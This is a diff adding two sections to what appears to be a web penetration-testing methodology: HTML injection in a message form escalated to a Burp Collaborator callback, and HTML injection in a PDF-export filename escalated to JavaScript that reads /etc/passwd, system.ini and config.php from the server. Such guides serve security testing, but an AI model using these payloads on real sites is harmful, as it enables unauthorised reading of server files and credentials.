@@ -232,6 +232,134 @@ When they click the "Next page →" link → `jQuery replaceWith()` loads your r
 
 ***
 
+#### Send Message Functionality HTML Injection to Server Side Request Forgery
+
+{% stepper %}
+{% step %}
+Log into the target site and check if there is a point in the application that sends a message to another user or as an email, and find the Send Message functionality or Email Form
+{% endstep %}
+
+{% step %}
+Enter a normal email like `test@example.com` and submit the form
+{% endstep %}
+
+{% step %}
+Intercept the `POST` request with Burp Suite and send to Repeater
+{% endstep %}
+
+{% step %}
+In the email parameter, replace the value with this exact payload
+
+```javascript
+<script>alert(1)</script>
+```
+{% endstep %}
+
+{% step %}
+Send the request and check if the alert pops or if the script renders
+{% endstep %}
+
+{% step %}
+If no alert but the field allows injection without @ symbol, try a basic HTML breakout
+{% endstep %}
+
+{% step %}
+Send and refresh the page or view as another user and if Hello renders, HTML Injection confirmed Then escalate with an external image load
+
+```html
+hello"><h1><img src="https://miro.medium.com/v2/resize:fit:1400/0*y2OAF_DSarBAjihO.jpg"></h1>
+```
+{% endstep %}
+
+{% step %}
+If the image loads from third-party, SSRF potential confirmed
+{% endstep %}
+
+{% step %}
+Then use Burp Collaborator for IP exfiltration
+
+```html
+hello"><h1><img src="https://*.burpcollaborator.net/hacked.jpg"></h1>
+```
+{% endstep %}
+
+{% step %}
+Submit and check Burp Collaborator for `HTTP/DNS` interactions,if callback received, SSRF + CSRF via IP leak confirmed
+{% endstep %}
+
+{% step %}
+Test the email parameter on other input endpoints like `/contact`, `/feedback`, `/reset`, `/signup`, or `/profile` as they often reflect input without @ validation
+{% endstep %}
+{% endstepper %}
+
+***
+
+#### Server File Reading via PDF Export
+
+{% stepper %}
+{% step %}
+Go to any file upload feature that supports PDF export like reports, invoices, profiles, documents, attachments
+{% endstep %}
+
+{% step %}
+Upload a normal file with a safe name like `test.pdf`
+{% endstep %}
+
+{% step %}
+Trigger PDF generation and download the file, open it to confirm filename appears inside
+{% endstep %}
+
+{% step %}
+Intercept the upload POST request with Burp Suite and send to Repeater
+{% endstep %}
+
+{% step %}
+In the filename parameter replace the value with this HTML breakout payload
+
+```html
+"><h1>XSS Test</h1>
+```
+{% endstep %}
+
+{% step %}
+Send the request and generate a new PDF
+{% endstep %}
+
+{% step %}
+Open the PDF, if \<h1>XSS Test\</h1> renders As large text, HTML Injection into PDF template confirmed
+{% endstep %}
+
+{% step %}
+Then escalate with this JavaScript LFI payload (works in `wkhtmltopdf`, `Chrome PDF`, etc.)
+
+```html
+"><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
+```
+{% endstep %}
+
+{% step %}
+Or for Windows servers
+
+```html
+"><script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///C:/Windows/system.ini");x.send();</script>
+```
+{% endstep %}
+
+{% step %}
+Generate the PDF again and open it, If `/etc/passwd` or `system.ini` contents are printed inside the PDF, Critical Local File Inclusion (LFI) via PDF HTML Injection confirmed
+{% endstep %}
+
+{% step %}
+Then read other sensitive files
+
+* file:///etc/hosts
+* file:///proc/version
+* file:///var/www/html/config.php
+{% endstep %}
+{% endstepper %}
+
+***
+
 ### White Box
 
 ## Cheat Sheet
